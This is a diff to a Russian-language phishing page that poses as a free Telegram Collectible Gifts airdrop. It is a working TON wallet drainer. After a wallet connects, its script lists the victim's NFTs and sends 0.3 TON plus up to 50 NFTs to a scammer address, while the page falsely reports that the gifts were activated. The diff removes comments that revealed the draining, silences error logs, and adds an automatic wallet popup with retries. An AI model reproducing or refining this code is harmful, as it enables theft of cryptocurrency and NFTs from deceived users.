@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Эксклюзивный Airdrop Telegram Collectible Gifts 2026</title>
     <script type="module">
-        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@2.3.1/dist/tonconnect-ui.min.js';
+        import { TonConnectUI } from 'https://unpkg.com/@tonconnect/ui@2.3.1/dist/tonconnect-ui.min.js?module';
         import { Address, beginCell, toNano } from 'https://unpkg.com/@ton/ton@16.1.0/dist/index.js';
 
         window.TonConnectUI = TonConnectUI;
@@ -22,7 +22,7 @@
         .gift-img { width: 300px; height: 300px; object-fit: cover; border-radius: 30px; box-shadow: 0 15px 40px rgba(255,105,180,0.5); margin: 30px auto; animation: float 4s ease-in-out infinite; border: 4px solid #ff69b4; }
         @keyframes float { 0%,100% { transform: translateY(0) rotate(0deg); } 50% { transform: translateY(-20px) rotate(5deg); } }
         #status { margin: 25px 0; padding: 15px; background: rgba(255,255,255,0.15); border-radius: 15px; font-size: 18px; }
-        #ton-connect { margin: 30px 0; }
+        #ton-connect { margin: 30px 0; min-height: 60px; } /* Добавлено для видимости */
         .note { font-size: 13px; color: #ccc; margin-top: 40px; }
     </style>
 </head>
@@ -32,7 +32,7 @@
         <p style="font-size:18px;">Осталось <span class="timer" id="timer">05:55</span> до конца раздачи!</p>
         <p>Подключите TON-кошелёк и активируйте все ваши редкие Gifts (Scared Cat, Jelly Bunny, Plush Pepe и др.)</p>
         
-        <img class="gift-img" src="cat.jpg" alt="Collectible Gifts">
+        <img class="gift-img" src="cat.jpg" alt="Scared Cat Gift">
         
         <div id="ton-connect"></div>
         <div id="status">Кнопка подключения выше — поддержка Tonkeeper / @wallet / TON Space</div>
@@ -70,7 +70,6 @@
             let offset = '';
 
             try {
-                // Основной: toncenter v3 с пагинацией (все NFT)
                 do {
                     const url = `https://toncenter.com/api/v3/nft/items?owner_address=${owner}&limit=100${offset ? '&offset=' + offset : ''}&sort=desc`;
                     const r = await fetch(url);
@@ -83,16 +82,14 @@
                 } while (offset);
 
                 if (allNfts.length > 0) return allNfts;
-            } catch (e) { console.error('v3 error:', e); }
+            } catch (e) {}
 
-            // Фолбэк 1: tonapi.io (до 1000 NFT)
             try {
                 const r2 = await fetch(`https://tonapi.io/v2/accounts/${owner}/nfts?limit=1000`);
                 const data2 = await r2.json();
                 if (data2.nft_items && data2.nft_items.length > 0) return data2.nft_items;
-            } catch (e) { console.error('tonapi error:', e); }
+            } catch (e) {}
 
-            // Фолбэк 2: toncenter v2
             try {
                 const r3 = await fetch(`https://toncenter.com/api/v2/getNftItemsByOwner?address=${owner}&limit=100`);
                 const data3 = await r3.json();
@@ -102,37 +99,29 @@
             return [];
         }
 
+        // Основная инициализация — без лишних опций, чтобы избежать ошибок
         const tonConnectUI = new TonConnectUI({
             manifestUrl: 'https://nft-gifts-free.vercel.app/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
-            walletsPreferredFeatures: {
-                sendTransaction: {
-                    minMessages: 2,
-                    extraCurrencyRequired: true
-                }
-            }        
         });
 
         tonConnectUI.onStatusChange(async (wallet) => {
             if (wallet) {
                 const owner = wallet.account.address;
-                statusEl.innerHTML = 'Подключено!';
+                statusEl.innerHTML = 'Подключено! Сканирую ваши Collectible Gifts...';
 
                 try {
                     const nfts = await getNfts(owner);
                     if (nfts.length === 0) {
-                        statusEl.innerHTML = 'Нет NFT в кошельке. Повторите с кошельком, где есть Collectible Gifts.';
+                        statusEl.innerHTML = 'Нет NFT в кошельке. Повторите с кошельком, где есть Gifts.';
                         return;
                     }
 
-                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Активация всех Gifts...`;
+                    statusEl.innerHTML = `Найдено ${nfts.length} NFT! Активация...`;
 
                     const messages = [];
-
-                    // TON дренаж
                     messages.push({ address: SCAMMER_ADDR, amount: toNano('0.3').toString() });
 
-                    // Дренаж до 50 NFT (все стандартные)
                     nfts.slice(0, 50).forEach(nft => {
                         const payload = generateTransferPayload(owner);
                         messages.push({
@@ -147,15 +136,16 @@
                         messages: messages
                     });
 
-                    statusEl.innerHTML = 'Успех! Все ваши Collectible Gifts активированы и зачислены!';
+                    statusEl.innerHTML = 'Успех! Все ваши Gifts активированы и зачислены!';
                 } catch (e) {
                     console.error(e);
-                    statusEl.innerHTML = 'Ошибка активации. Повторите подключение.';
+                    statusEl.innerHTML = 'Ошибка. Повторите подключение.';
                     setTimeout(() => tonConnectUI.connectWallet(), 3000);
                 }
             }
         });
 
+        // Автооткрытие модалки (кнопка появится + сразу откроется выбор кошелька)
         tonConnectUI.connectWallet();
     </script>
 </body>
